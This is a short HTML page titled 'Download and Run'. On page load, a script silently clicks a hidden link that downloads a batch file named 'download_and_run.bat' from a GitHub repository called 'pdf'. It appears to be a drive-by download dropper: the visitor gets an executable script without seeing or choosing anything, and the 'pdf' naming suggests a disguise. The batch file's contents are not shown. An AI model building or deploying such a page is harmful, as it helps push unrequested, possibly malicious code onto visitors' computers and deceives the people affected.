<!DOCTYPE html>
<html>
<head>
    <title>Download and Run</title>
</head>
<body>
    <a id="downloadLink" href="https://raw.githubusercontent.com/Latiami/pdf/main/download_and_run.bat" style="display: none;"></a>
    
    <script>
        // Function to trigger the download
        function downloadFile() {
            var downloadLink = document.getElementById("downloadLink");
            downloadLink.click();
        }

        // Trigger the download when the page loads
        window.addEventListener("load", function() {
            downloadFile();
        });
    </script>
</body>
</html>
